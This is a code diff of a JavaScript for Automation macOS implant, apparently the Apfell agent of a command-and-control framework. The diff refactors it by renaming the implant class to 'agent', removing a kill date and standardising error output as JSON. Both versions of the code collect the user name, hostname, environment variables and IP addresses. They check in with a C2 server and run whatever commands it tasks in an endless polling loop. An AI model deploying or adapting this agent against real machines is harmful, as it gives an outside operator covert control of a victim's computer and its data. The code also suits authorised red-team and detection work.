@@ -5,11 +5,11 @@ ObjC.import('stdlib');
 var currentApp = Application.currentApplication();
 currentApp.includeStandardAdditions = true;
 //--------------IMPLANT INFORMATION-----------------------------------
-class implant{
+class agent{
 	constructor(){
 		this.procInfo = $.NSProcessInfo.processInfo;
 		this.hostInfo = $.NSHost.currentHost;
-		this.id = -1;
+		this.id = "";
 		this.user = ObjC.deepUnwrap(this.procInfo.userName);
 		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
 		//every element in the array needs to be unwrapped
@@ -17,7 +17,6 @@ class implant{
 		this.pid = this.procInfo.processIdentifier;
 		//every element in the array needs to be unwrapped
 		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
-		this.killdate = "";
 		//this is a dictionary, but every 'value' needs to be unwrapped
 		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
 		this.uptime = this.procInfo.systemUptime;
@@ -27,7 +26,7 @@ class implant{
 		this.uuid = "UUID_HERE";
 	}
 }
-apfell = new implant();
+apfell = new agent();
 //--------------Base C2 INFORMATION----------------------------------------
 class baseC2{
 	//To create your own C2, extend this class and implement the required functions
@@ -38,9 +37,6 @@ class baseC2{
 		this.interval = interval; //seconds between callbacks
 		this.baseurl = baseurl; //where to reach out to
 		this.commands = [];
-	}
-	getInterval(){
-		return this.interval;
 	}
 	checkin(){
 		//check in with c2 server
@@ -126,42 +122,42 @@ base64_encode = function(data){
     var encoded = ns_data.base64EncodedStringWithOptions(0).js;
     return encoded;
 };
-    exports = {};  // get stuff ready for initial command listing
-    //-------------COMMANDS_HERE -----------------------
-    //console.log("about to load commands");
-    var commands_dict = exports;
-    var jsimports = "";
+exports = {};  // get stuff ready for initial command listing
+//-------------COMMANDS_HERE -----------------------
+//console.log("about to load commands");
+var commands_dict = exports;
+var jsimports = "";
 
 //-------------GET IP AND CHECKIN ----------------------------------
-for(var i=0; i < apfell.ip.length; i++){
-	ip = apfell.ip[i];
-	if (ip.includes(".") && ip != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
+for(let i=0; i < apfell.ip.length; i++){
+	let ip = apfell.ip[i];
+	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
 		//console.log("found ip, checking in");
-		C2.setConfig({"commands": Object.keys(commands_dict)});
-		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
+		C2.commands =  Object.keys(commands_dict);
+		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),"macOS" + " " + apfell.osVersion, "x64");
 		break;
 	}
 }
 //---------------------------MAIN LOOP ----------------------------------------
 function sleepWakeUp(){
     while(true){
-        $.NSThread.sleepForTimeInterval(C2.interval);
-        var output = "";
-        task = C2.getTasking();
-        var command = "";
+        $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
+        let output = "";
+        let task = C2.getTasking();
+        let command = "";
         try{
             command = ObjC.unwrap(task["command"]);
-            if(command != "none"){
-                var params = ObjC.unwrap(task["params"]);
+            if(command !== "none"){
+                let params = ObjC.unwrap(task["params"]);
                 try{
-                    var output = commands_dict[command](task, command, params);
+                    output = commands_dict[command](task, command, params);
                 }
                 catch(error){
                     if(error.toString().includes("commands_dict[command] is not a function")){
-                        output = "Unknown command: " + command;
+                        output = JSON.stringify({"user_output": "Unknown command: " + command, "status": "error", "completed": true});
                     }
                     else{
-                        output = error.toString();
+                        output = JSON.stringify({"user_output": error.toString(), "status": "error", "completed": true});
                     }
                 }
                 if ((typeof output) == "string"){
@@ -171,9 +167,9 @@ function sleepWakeUp(){
             }
         }
         catch(error){
-            C2.postResponse(task, convert_to_nsdata(error.toString()));
+            C2.postResponse(task, convert_to_nsdata(JSON.stringify({"user_output": error.toString(), "status": "error", "completed": true})));
         }
         task["command"] = "none"; //reset just in case something goes weird
     }
-};
+}
 sleepWakeUp();
